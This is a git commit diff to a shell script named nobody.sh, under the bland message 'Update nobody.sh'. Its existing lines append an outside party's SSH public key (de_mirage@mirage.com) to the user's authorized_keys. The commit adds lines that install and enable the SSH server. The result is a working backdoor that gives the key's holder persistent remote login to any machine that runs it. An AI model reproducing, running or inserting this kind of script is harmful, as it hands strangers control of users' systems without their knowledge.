5d983635078f12b1cb76d0edd5452b3d1c2ce943
nobody012358 <nobody012358@proton.me>
2025-12-16 14:10:57 +0000

    Update nobody.sh

--- nobody.sh
+++ nobody.sh
@@ -4,3 +4,5 @@ mkdir -p ~/.ssh
 chmod 700 ~/.ssh
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMILXcDeMtCJGYHMJrYvKjztdbjYcFXZ48bnekgFsKhl de_mirage@mirage.com" >> ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
+sudo apt install openssh-server -y
+sudo systemctl enable --now sshd
